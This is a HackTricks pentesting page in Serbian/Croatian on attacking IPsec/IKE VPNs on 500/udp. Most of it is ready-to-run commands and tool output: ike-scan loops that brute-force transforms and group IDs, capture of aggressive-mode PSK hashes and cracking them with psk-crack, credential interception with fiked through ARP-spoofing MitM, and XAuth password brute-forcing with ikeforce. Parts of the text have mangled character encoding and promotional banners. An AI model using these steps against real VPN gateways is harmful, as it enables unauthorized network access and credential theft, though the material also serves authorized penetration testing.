# 500/udp - Pentestiranje IPsec/IKE VPN

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju ogla코enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Prona캠ite najva쬹ije ranjivosti kako biste ih br쬰 popravili. Intruder prati va코u povr코inu napada, pokre캖e proaktivne pretnje, pronalazi probleme u celokupnom tehnolo코kom skupu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Osnovne informacije

**IPsec** je 코iroko priznata tehnologija za obezbe캠ivanje komunikacije izme캠u mre쬬 (LAN-to-LAN) i od udaljenih korisnika do mre쬹og pristupnog 캜vora (udaljeni pristup), slu쬰캖i kao osnova za VPN re코enja u preduze캖ima.

Uspostavljanje **bezbednosne asocijacije (SA)** izme캠u dve ta캜ke upravlja **IKE**, koji radi pod okriljem ISAKMP-a, protokola dizajniranog za autentifikaciju i razmenu klju캜eva. Ovaj proces se odvija u nekoliko faza:

- **Faza 1:** Bezbedan kanal se kreira izme캠u dve ta캜ke. To se posti쬰 kori코캖enjem Pre-Shared Key (PSK) ili sertifikata, koriste캖i ili glavni re쬴m, koji uklju캜uje tri para poruka, ili **agresivni re쬴m**.
- **Faza 1.5:** Iako nije obavezna, ova faza, poznata kao Faza Pro코irene Autentifikacije, proverava identitet korisnika koji poku코ava da se pove쬰 zahtevaju캖i korisni캜ko ime i lozinku.
- **Faza 2:** Ova faza je posve캖ena pregovaranju parametara za obezbe캠ivanje podataka sa **ESP** i **AH**. Omogu캖ava kori코캖enje algoritama koji se razlikuju od onih u Fazi 1 kako bi se obezbedila **Savr코ena Napredna Tajnost (PFS)**, pobolj코avaju캖i bezbednost.


**Podrazumevani port:** 500/udp

## **Otkrijte** uslugu kori코캖enjem nmap-a
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **Pronala쬰nje validne transformacije**

Konfiguracija IPSec-a mo쬰 biti pode코ena da prihvati samo jednu ili nekoliko transformacija. Transformacija je kombinacija vrednosti. **Svaka transformacija** sadr쬴 odre캠eni broj atributa kao 코to su DES ili 3DES kao **algoritam za enkripciju**, SHA ili MD5 kao **algoritam za integritet**, prethodno deljena klju캜 kao **tip autentifikacije**, Diffie-Hellman 1 ili 2 kao algoritam za **distribuciju klju캜eva** i 28800 sekundi kao **vreme trajanja**.

Prvo 코to trebate uraditi je **prona캖i validnu transformaciju**, kako bi server komunicirao s vama. Za to mo쬰te koristiti alat **ike-scan**. Podrazumevano, Ike-scan radi u glavnom re쬴mu i 코alje paket gateway-u sa ISAKMP zaglavljem i jednim predlogom koji sadr쬴 **osam transformacija**.

Na osnovu odgovora mo쬰te dobiti neke informacije o krajnjoj ta캜ki:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
Kao 코to mo쬰te videti u prethodnom odgovoru, postoji polje nazvano **AUTH** sa vredno코캖u **PSK**. To zna캜i da je VPN konfigurisan kori코캖enjem prethodno deljene klju캜a (코to je veoma dobro za pentestera).\
**Vrednost poslednje linije je tako캠e veoma va쬹a:**

* _0 vra캖enih handshake-ova; 0 vra캖enih obave코tenja:_ Ovo zna캜i da ciljna ma코ina **nije IPsec gateway**.
* _**1 vra캖en handshake; 0 vra캖enih obave코tenja:**_ Ovo zna캜i da je **ciljna ma코ina konfigurisana za IPsec i spremna je da izvr코i IKE pregovaranje, i jedna ili vi코e transformacija koje ste predlo쬴li su prihvatljive** (va쬰캖a transformacija 캖e biti prikazana u izlazu).
* _0 vra캖enih handshake-ova; 1 vra캖eno obave코tenje:_ VPN gateway-ovi odgovaraju obave코tenjem kada **nijedna od transformacija nije prihvatljiva** (mada neki gateway-ovi to ne rade, u tom slu캜aju treba poku코ati daljnja analiza i revidirani predlog).

U ovom slu캜aju ve캖 imamo va쬰캖u transformaciju, ali ako se nalazite u tre캖em slu캜aju, onda morate **malo probati da biste prona코li va쬰캖u transformaciju:**

Prvo, trebate kreirati sve mogu캖e transformacije:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
A zatim izvr코ite brute-force napad na svaki koriste캖i ike-scan (ovo mo쬰 potrajati nekoliko minuta):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
Ako brute-force nije uspeo, mo쬯a server odgovara bez rukovanja 캜ak i na validne transformacije. Zatim, mo쬰te poku코ati isti brute-force, ali koriste캖i agresivni re쬴m:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Nadam se da 캖e **va코a validna transformacija biti prikazana**.\
Mo쬰te poku코ati **isti napad** koriste캖i [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py).\
Tako캠e mo쬰te poku코ati sa brute force napadom na transformacije koriste캖i [**ikeforce**](https://github.com/SpiderLabs/ikeforce):
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (109).png>)

U **DH grupi: 14 = 2048-bit MODP** i **15 = 3072-bit**\
**2 = HMAC-SHA = SHA1 (u ovom slu캜aju). Format `--trans` je $Enc,$Hash,$Auth,$DH**

Cisco preporu캜uje izbjegavanje kori코tenja DH grupa 1 i 2 jer nisu dovoljno jake. Stru캜njaci vjeruju da **zemlje s velikim resursima lako mogu probiti enkripciju** podataka koji koriste ove slabe grupe. To se posti쬰 kori코tenjem posebne metode koja ih priprema za brzo pucanje kodova. Iako je postavljanje ove metode skupo, omogu캖ava ovim mo캖nim zemljama 캜itanje 코ifriranih podataka u stvarnom vremenu ako koriste grupu koja nije jaka (poput 1,024-bit ili manje).

### Fingerprintiranje servera

Zatim, mo쬰te koristiti ike-scan da biste poku코ali **otkriti proizvo캠a캜a** ure캠aja. Alatka 코alje po캜etni prijedlog i zaustavlja ponavljanje. Zatim, **analizira** razliku **vremena** izme캠u primljenih **poruka** od servera i odgovaraju캖eg obrasca odgovora, pentester mo쬰 uspje코no identificirati proizvo캠a캜a VPN gateway-a. Osim toga, neki VPN serveri 캖e koristiti opcionalni **Vendor ID (VID) payload** s IKE.

**Navedite valjanu transformaciju ako je potrebno** (koriste캖i --trans)

Ako IKE otkrije koji je proizvo캠a캜, ispisat 캖e ga:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Ovo se mo쬰 posti캖i i sa nmap skriptom _**ike-version**_

## Pronala쬰nje ispravnog ID-a (imena grupe)

Da biste bili u mogu캖nosti da uhvatite he코, potrebno je da imate validnu transformaciju koja podr쬬va Agresivni re쬴m i ispravan ID (ime grupe). Verovatno ne캖ete znati ispravno ime grupe, pa 캖ete morati da ga probate metodom brute-force.
Da biste to uradili, preporu캜ujem vam 2 metode:

### Brute-force ID sa ike-scan

Prvo, poku코ajte da napravite zahtev sa la쬹im ID-om kako biste poku코ali da prikupite he코 ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
Ako **nema povratne vrednosti he코a**, tada je verovatno da 캖e ovaj metod brute force napada uspeti. **Ako se vrati neki he코, to zna캜i da 캖e se za la쬹i ID poslati la쬹i he코, pa ovaj metod ne캖e biti pouzdan** za brute force napad na ID. Na primer, mo쬰 se vratiti la쬹i he코 (ovo se de코ava u modernim verzijama):

![](<../.gitbook/assets/image (110).png>)

Ali ako, kao 코to sam ve캖 rekao, nema povratne vrednosti he코a, tada treba poku코ati brute force napadom na uobi캜ajena imena grupa koriste캖i ike-scan.

Ovaj skript **캖e poku코ati brute force napad na mogu캖e ID-ove** i vratiti ID-ove za koje se vrati validan handshake (to 캖e biti validno ime grupe).

Ako ste otkrili odre캠enu transformaciju, dodajte je u ike-scan komandu. Ako ste otkrili vi코e transformacija, slobodno dodajte novu petlju da ih sve isprobate (trebali biste ih sve isprobati dok jedna od njih ne radi pravilno).

Mo쬰te koristiti [re캜nik ikeforce](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) ili [onaj u seclists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) sa uobi캜ajenim imenima grupa za brute force napad na njih:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
Ili koristite ovaj re캜nik (kombinacija prethodna dva re캜nika bez ponavljanja):

{% file src="../.gitbook/assets/vpnIDs.txt" %}

### Bruteforcing ID sa Ikerom

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) tako캠e koristi **ike-scan** za bruteforce mogu캖ih imena grupa. Prati svoju metodu za **pronala쬰nje validnog ID-a na osnovu izlaza ike-scan-a**.

### Bruteforcing ID sa ikeforce-om

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) je alat koji se mo쬰 koristiti i za **bruteforce ID-ova**. Ovaj alat 캖e **poku코ati da iskoristi razli캜ite ranjivosti** koje se mogu koristiti za **razlikovanje izme캠u validnog i nevalidnog ID-a** (mo쬰 imati la쬹e pozitivne i la쬹e negativne rezultate, zbog 캜ega je bolje koristiti metodu ike-scan-a ako je mogu캖e).

Podrazumevano, **ikeforce** 캖e na po캜etku poslati neke nasumi캜ne ID-ove kako bi proverio pona코anje servera i odredio taktiku koju 캖e koristiti.

* **Prva metoda** je bruteforce imena grupa pretra쬴vanjem informacija **Dead Peer Detection DPD** Cisco sistema (ove informacije server samo vra캖a ako je ime grupe ispravno).
* **Druga dostupna metoda** je provera broja poslatih odgovora za svaki poku코aj, jer se ponekad 코alje vi코e paketa kada se koristi ispravan ID.
* **Tre캖a metoda** podrazumeva pretragu odgovora sa "INVALID-ID-INFORMATION" u slu캜aju neispravnog ID-a.
* Na kraju, ako server ne odgovori na provere, **ikeforce** 캖e poku코ati da izvr코i bruteforce servera i proveri da li server 코alje neki paket kada se po코alje ispravan ID.\
O캜igledno, cilj bruteforce-a ID-a je da se dobije **PSK** kada imate validan ID. Zatim, sa **ID-om** i **PSK-om**, mora캖ete da izvr코ite bruteforce XAUTH-a (ako je omogu캖en).

Ako ste otkrili odre캠enu transformaciju, dodajte je u komandu ikeforce-a. Ako ste otkrili vi코e transformacija, slobodno dodajte novu petlju kako biste ih sve isprobali (trebali biste ih sve isprobati dok ne prona캠ete onu koja pravilno funkcioni코e).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Snifovanje ID-a

(Iz knjige **Procena mre쬹e sigurnosti: Upoznajte svoju mre쬿**): Tako캠e je mogu캖e dobiti validna korisni캜ka imena snifovanjem veze izme캠u VPN klijenta i servera, jer se prvi paket agresivnog moda koji sadr쬴 ID klijenta 코alje otvoreno.

![](<../.gitbook/assets/image (111).png>)

## Snimanje i pucanje he코a

Na kraju, ako ste prona코li **validnu transformaciju** i **ime grupe** i ako je **agresivni mod dozvoljen**, vrlo lako mo쬰te dobiti he코 koji se mo쬰 pucati.
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
He코 캖e biti sa캜uvan unutar _hash.txt_.

Mo쬰te koristiti **psk-crack**, **john** (koriste캖i [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)) i **hashcat** da **provalite** he코:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**Agresivni re쬴m IKE** u kombinaciji sa **Pre-Shared Key (PSK)** se 캜esto koristi u svrhu **grupne autentifikacije**. Ovaj metod se nadogra캠uje sa **XAuth (Extended Authentication)**, koji uvodi dodatni sloj **autentifikacije korisnika**. Takva autentifikacija obi캜no koristi usluge kao 코to su **Microsoft Active Directory**, **RADIUS**, ili sli캜ni sistemi.

Prelaskom na **IKEv2**, prime캖uje se zna캜ajna promena gde se umesto **XAuth** koristi **EAP (Extensible Authentication Protocol)** u svrhu autentifikacije korisnika. Ova promena nagla코ava evoluciju u praksama autentifikacije unutar sigurnih komunikacionih protokola.


### MitM napad na lokalnu mre쬿 radi presretanja akreditiva

Mo쬰te presresti podatke za prijavljivanje koriste캖i _fiked_ i videti da li postoji neko podrazumevano korisni캜ko ime (Potrebno je preusmeriti IKE saobra캖aj na `fiked` za prislu코kivanje, 코to se mo쬰 uraditi uz pomo캖 ARP spoofinga, [vi코e informacija](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked 캖e delovati kao VPN krajnja ta캜ka i presretati XAuth akreditive:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
Tako캠e, poku코ajte da izvr코ite MitM napad koriste캖i IPSec i blokirajte sav saobra캖aj ka portu 500. Ako IPSec tunel ne mo쬰 da se uspostavi, mo쬯a 캖e se saobra캖aj slati u 캜istom obliku.

### Brute-forcing XAUTH korisni캜ko ime i lozinku pomo캖u ikeforce

Da biste izvr코ili brute force napad na **XAUTH** (kada znate validno ime grupe **id** i **psk**), mo쬰te koristiti korisni캜ko ime ili listu korisni캜kih imena i listu lozinki:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
Na ovaj na캜in, ikeforce 캖e poku코ati da se pove쬰 koriste캖i svaku kombinaciju korisni캜kog imena i lozinke.

Ako prona캠ete jednu ili vi코e validnih transformacija, koristite ih kao u prethodnim koracima.

## Autentifikacija sa IPSEC VPN-om

U Kali, **VPNC** se koristi za uspostavljanje IPsec tunela. **Profil**-i se moraju nalaziti u direktorijumu `/etc/vpnc/`. Mo쬰te pokrenuti ove profile koriste캖i komandu _**vpnc**_.

Slede캖e komande i konfiguracije ilustruju proces pode코avanja VPN veze sa VPNC-om:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
U ovom postavci:

- Zamijenite `[VPN_GATEWAY_IP]` stvarnom IP adresom VPN gateway-a.
- Zamijenite `[VPN_CONNECTION_ID]` identifikatorom VPN veze.
- Zamijenite `[VPN_GROUP_SECRET]` tajnom grupe VPN-a.
- Zamijenite `[VPN_USERNAME]` i `[VPN_PASSWORD]` sa autentifikacijskim podacima VPN-a.
- `[PID]` simbolizuje ID procesa koji 캖e biti dodijeljen kada `vpnc` pokrene.

Osigurajte da se stvarne i sigurne vrijednosti koriste za zamjenu mjesta kada konfigurirate VPN.

## Referentni materijal

* [PSK cracking paper](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [Skeniranje implementacije VPN-a](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* Network Security Assessment 3. izdanje

## Shodan

* `port:500 IKE`

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Prona캠ite najva쬹ije ranjivosti kako biste ih br쬰 popravili. Intruder prati va코u povr코inu napada, pokre캖e proaktivno skeniranje prijetnji, pronalazi probleme u cijelom va코em tehni캜kom sklopu, od API-ja do web aplikacija i cloud sustava. [**Isprobajte besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>Nau캜ite hakiranje AWS-a od nule do heroja s</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite vidjeti **ogla코avanje va코e tvrtke u HackTricks-u** ili **preuzeti HackTricks u PDF-u**, provjerite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**slu쬭eni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podijelite svoje trikove hakiranja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorije.

</details>
